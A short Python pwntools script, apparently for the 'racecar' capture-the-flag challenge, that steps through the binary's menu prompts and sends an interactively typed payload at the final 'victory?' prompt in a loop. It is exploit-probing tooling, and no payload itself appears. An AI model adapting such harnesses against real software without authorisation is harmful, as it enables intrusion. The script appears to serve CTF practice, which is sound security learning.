from pwn import *

context.log_level = 'ERROR'

def exploit(payload: str):
	conn = process('/home/kali/Downloads/racecar')
	conn.sendlineafter(b'Name', b'aki')
	conn.sendlineafter(b'Nickname', b'aki')
	conn.sendlineafter(b'selection', b'2')
	conn.sendlineafter(b'car', b'1')
	conn.sendlineafter(b'Circuit', b'2')
	conn.sendlineafter(b'victory?', bytes(payload, encoding='utf-8'))
	conn.recv()
	print(conn.recv().decode('utf-8'))
	conn.close()

if __name__ == '__main__':
	while True:
		exploit(input('Enter payload: '))